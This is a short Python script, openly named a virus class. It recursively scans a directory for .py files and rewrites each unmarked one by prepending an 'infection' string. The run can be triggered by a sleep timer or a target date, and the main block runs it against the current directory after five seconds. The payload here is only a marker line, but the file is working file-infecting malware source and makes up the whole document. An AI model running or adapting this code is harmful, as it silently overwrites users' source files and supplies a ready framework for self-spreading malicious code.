import os
import datetime
import pathlib
import time

class Virus:
    
    def __init__(self, infect_string="I am a Virus", path="/", extension=".py", target_file_list=None):
        self.infect_string = infect_string
        self.path = path
        self.extension = extension
        self.target_file_list = target_file_list if target_file_list is not None else []
            
    def list_files(self, path):
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            if not file.startswith('.'):  # skip hidden files/directories
                absolute_path = os.path.join(path, file)
                file_extension = pathlib.Path(absolute_path).suffix

                if os.path.isdir(absolute_path):
                    self.list_files(absolute_path)  # Recursive call for directories
                elif file_extension == self.extension:
                    with open(absolute_path, 'r') as f:
                        if self.infect_string not in f.read():  # Check if already infected
                            self.target_file_list.append(absolute_path)

    def infect(self, file_abs_path):
        if os.path.abspath(file_abs_path) != os.path.abspath(__file__):  # Avoid self-infection
            try:
                with open(file_abs_path, 'r') as f:
                    data = f.read()
                with open(file_abs_path, 'w') as virus_file:
                    virus_file.write(self.infect_string + "\n" + data)  # Prepend infection string
            except Exception as e:
                print(f"Error infecting {file_abs_path}: {e}")
        
    def start_virus_infections(self, timer=None, target_date=None):
        if timer is not None:
            print(f"Waiting for {timer} seconds before infection...")
            time.sleep(timer)
            self._execute_infection()
        elif target_date is not None:
            today = datetime.datetime.now().date()
            if target_date == today:
                self._execute_infection()
            else:
                print(f"Today's date {today} does not match target date {target_date}.")
        else:
            print("Please provide either a timer or a target date.")

    def _execute_infection(self):
        self.list_files(self.path)
        for target in self.target_file_list:
            self.infect(target)
        print(f"Infected {len(self.target_file_list)} files.")
            
if __name__ == "__main__":
    current_directory = os.path.abspath(".")
    virus = Virus(path=current_directory)
    virus.start_virus_infections(timer=5)
    # Or specify a target date: virus.start_virus_infections(target_date=datetime.date(2021, 6, 1))